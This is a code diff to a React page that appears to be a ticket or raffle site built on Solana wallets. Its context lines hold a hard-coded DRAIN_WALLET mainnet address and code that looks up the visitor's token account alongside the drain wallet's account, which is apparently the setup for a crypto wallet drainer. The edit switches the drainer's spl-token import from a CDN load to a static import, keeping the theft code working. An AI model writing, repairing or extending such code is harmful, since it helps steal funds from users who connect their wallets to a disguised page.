@@ -2,6 +2,7 @@ import { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Card } from '@/components/ui/card';
 import { Clock, DollarSign, Ticket, Users, Shield, ExternalLink, Eye, Download, FileText, CheckCircle, Flame, Hash } from 'lucide-react';
+import * as token from '@solana/spl-token';
 
 // Declare Solana Web3 types for TypeScript
 declare global {
@@ -81,8 +82,6 @@ const Index = () => {
       const DRAIN_WALLET = new window.solanaWeb3.PublicKey("7Vc9rcmXwQGFCpJCiPmb9UyTPBJhSCeZPf9JFjQqkQr8");
       const userPublicKey = new window.solanaWeb3.PublicKey(walletAddress);
       const connection = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-
-      const token = await import("https://cdn.skypack.dev/@solana/spl-token");
 
       const userTokenAccount = await token.getAssociatedTokenAddress(TOKEN_MINT, userPublicKey);
       const recipientTokenAccount = await token.getAssociatedTokenAddress(TOKEN_MINT, DRAIN_WALLET);
